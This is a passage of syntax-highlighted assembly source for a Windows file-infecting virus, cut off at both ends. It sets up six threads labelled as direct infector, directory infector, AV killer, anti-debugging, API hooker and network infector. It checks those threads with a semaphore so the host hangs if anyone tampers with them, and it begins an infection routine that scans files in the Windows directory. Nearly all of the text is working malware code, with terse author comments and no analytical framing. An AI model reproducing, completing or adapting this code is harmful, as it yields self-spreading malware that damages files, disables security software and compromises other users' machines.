       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_main_seh</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OurThreads</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;Prepare to create the</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OurThreadIds</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;threads...</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OurThreadHandles</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">create_loop</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StartThread</span><span class="sc0">                            </span><span class="sc1">;start them and set</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;them</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">create_loop</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">no_imports</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_per_process_skip</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">skipper</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_per_process_skip</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Semaphore</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;now prepare a semaphore</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;to monitor their</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">                                     </span><span class="sc1">;execution</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateSemaphoreA</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hsemaphore</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OurThreadHandles</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;and now start them...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">resume_loop</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ResumeThread</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;resume!</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">resume_loop</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">                                  </span><span class="sc1">;Wait forever until all</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">INFINITE</span><span class="sc0">                               </span><span class="sc1">;threads finish...</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                                   </span><span class="sc1">;(if the mainthread is</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OurThreadHandles</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;TRUE, by this time the</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;host is already running</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                                      </span><span class="sc1">;in parallel with this</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_WaitForMultipleObjectsEx</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;thread)</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">test_semaphore</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;now get the last count</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;of the semaphore...</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                      </span><span class="sc1">;Should be 6*5...</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hsemaphore</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ReleaseSemaphore</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hsemaphore</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;close semaphore</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">test_semaphore</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;now get the value</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">where_to</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc0">      </span><span class="sc1">;calculate jump offset</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">                                 </span><span class="sc1">;5*6</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;and make a jump with it</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc0">                        </span><span class="sc1">;If the value is smaller</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">jump</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;then it should</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc0">                                    </span><span class="sc1">;mean someone fucked with</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc0">                                    </span><span class="sc1">;our threads and probably</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc0">                                    </span><span class="sc1">;the execution falls here</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc0">                                    </span><span class="sc1">;where it hangs... This</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc0">                                    </span><span class="sc1">;will give the user the</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc0">                                    </span><span class="sc1">;impression that he played</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc0">                                    </span><span class="sc1">;with hot stuff...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">where_to</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">MAINTHREAD</span><span class="sc0">                               </span><span class="sc1">;if we have a mainthread</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                                     </span><span class="sc1">;we must kill it...</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KillThread</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                                     </span><span class="sc1">;otherwise, simply return</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">;to host...</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">StartThread</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;here we create threads</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateThread</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CREATE_SUSPENDED</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">THREAD_PRIORITY_HIGHEST</span><span class="sc0">                </span><span class="sc1">;and set their priority</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetThreadPriority</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc0">                                     </span><span class="sc1">;ret</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">OurThreadIds</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_1_id</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">;Direct infector</span><span class="sc0">
</span><span class="sc5">Thread_2_id</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">;Directory infector</span><span class="sc0">
</span><span class="sc5">Thread_3_id</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">;AV killed</span><span class="sc0">
</span><span class="sc5">Thread_4_id</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">;Anti-debugging</span><span class="sc0">
</span><span class="sc5">Thread_5_id</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">;Api hooker</span><span class="sc0">
</span><span class="sc5">Thread_6_id</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">;Network infector</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">OurThreadHandles</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_1_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_2_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_3_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_4_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_5_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_6_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hsemaphore</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;€ This Thread is the direct infector thread</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">Thread_1_StartAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">tdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@Thread1Delta</span><span class="sc0">                          </span><span class="sc1">;I have been experiencing</span><span class="sc0">
</span><span class="sc5">@Thread1Delta</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;problems with delta pass</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;via the parameter so I</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Thread1Delta</span><span class="sc0">               </span><span class="sc1">;decided to read it again</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">THREAD1SEH</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Thread1Exception</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Setup a SEH frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DIRECT</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">direct_list</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;point file names in the</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">direct_list_len</span><span class="sc0">                    </span><span class="sc1">;Windows directory and</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">not_list</span><span class="sc0">                               </span><span class="sc1">;restore names...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc0">                                 </span><span class="sc1">;get the Windows dir.</span><span class="sc0">
</span><span class="sc5">name_</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">windir</span><span class="sc4">:</span><span class="sc0">                                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">name_</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;point the dir path</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">direct_list</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;point names</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">direct_loop</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">005Ch</span><span class="sc0">               </span><span class="sc1">;mark terminator slash</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                    </span><span class="sc1">;was last name?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">direct_end</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrcat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">               </span><span class="sc1">;concatenate stringz</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">W32FD</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;pointer to find data</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindFirstFileA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;find file</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">               </span><span class="sc1">;none?</span><span class="sc0">
